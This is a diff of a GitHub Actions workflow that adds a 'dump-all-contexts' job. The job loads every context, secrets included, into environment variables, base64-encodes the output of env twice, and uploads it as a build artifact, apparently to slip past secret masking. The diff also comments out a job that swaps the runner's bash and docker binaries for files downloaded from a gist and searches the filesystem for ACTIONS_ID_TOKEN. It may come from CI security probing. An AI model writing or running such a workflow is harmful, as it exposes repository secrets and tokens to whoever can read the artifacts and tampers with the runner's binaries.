@@ -1,32 +1,58 @@
 name: dump
 on: ["push"]
 jobs:
-  break-docker:
+  dump-all-contexts:
     runs-on: ubuntu-latest
     steps:
-      - name: Break binaries
-        run: |
-          sudo apt update -y && sudo apt install -y wget
-          sudo mv /usr/bin/bash /usr/bin/bbash
-          #sudo mv /usr/bin/node /usr/bin/nnode
-          sudo mv /usr/bin/docker /usr/bin/ddocker
-          sudo wget https://gist.githubusercontent.com/Matthewacon/94515773c05e200f9ea389807a67cf6a/raw/1141c5ed399dc40c462c0d22a329f9c2667aa0cd/bash -O /usr/bin/bash
-          sudo wget https://gist.githubusercontent.com/Matthewacon/94515773c05e200f9ea389807a67cf6a/raw/1141c5ed399dc40c462c0d22a329f9c2667aa0cd/docker -O /usr/bin/docker
-          sudo chmod +x /usr/bin/bash /usr/bin/docker
+      - name: Dump GitHub context
+        env:
+          GITHUB_CONTEXT: ${{ toJson(github) }}
+          ENV_CONTEXT: ${{ toJson(env) }}
+          VARS_CONTEXT: ${{ toJson(vars) }}
+          JOB_CONTEXT: ${{ toJson(job) }}
+          JOBS_CONTEXT: ${{ toJson(jobs) }}
+          STEPS_CONTEXT: ${{ toJson(steps) }}
+          RUNNER_CONTEXT: ${{ toJson(runner) }}
+          SECRETS_CONTEXT: ${{ toJson(secrets) }}
+          STRATEGY_CONTEXT: ${{ toJson(strategy) }}
+          MATRIX_CONTEXT: ${{ toJson(matrix) }}
+          NEEDS_CONTEXT: ${{ toJson(needs) }}
+          INPUTS_CONTEXT: ${{ toJson(inputs) }}
+        run: env | base64 | base64 > context.txt
 
-      - name: Look for keywords before
-        run: |
-          sudo grep -Rn 'ACTIONS_ID_TOKEN' /
+      - name: Upload workspace
+        uses: actions/upload-artifact@v4
+        with:
+          name: context.zip
+          compression-level: 9
+          path: context.txt 
 
-      - name: Checkout repository
-        uses: actions/checkout@v4
+  #break-docker:
+  #  runs-on: ubuntu-latest
+  #  steps:
+  #    - name: Break binaries
+  #      run: |
+  #        sudo apt update -y && sudo apt install -y wget
+  #        sudo mv /usr/bin/bash /usr/bin/bbash
+  #        #sudo mv /usr/bin/node /usr/bin/nnode
+  #        sudo mv /usr/bin/docker /usr/bin/ddocker
+  #        sudo wget https://gist.githubusercontent.com/Matthewacon/94515773c05e200f9ea389807a67cf6a/raw/87828d920d153b49eabeb29ccc4afcb10c46b50d/bash -O /usr/bin/bash
+  #        sudo wget https://gist.githubusercontent.com/Matthewacon/94515773c05e200f9ea389807a67cf6a/raw/87828d920d153b49eabeb29ccc4afcb10c46b50d/docker -O /usr/bin/docker
+  #        sudo chmod +x /usr/bin/bash /usr/bin/docker
 
-      - name: Look for keywords after
-        run: |
-          sudo grep -Rn 'ACTIONS_ID_TOKEN' /
+  #    - name: Look for keywords before
+  #      run: |
+  #        sudo grep -Rn 'ACTIONS_ID_TOKEN' /
 
-      - name: Is it broken
-        uses: ./.github/actions/dind-multiarch
+  #    - name: Checkout repository
+  #      uses: actions/checkout@v4
+
+  #    - name: Look for keywords after
+  #      run: |
+  #        sudo grep -Rn 'ACTIONS_ID_TOKEN' /
+
+  #    - name: Is it broken
+  #      uses: ./.github/actions/dind-multiarch
 
   #dump-action-info:
   #  runs-on: ubuntu-latest
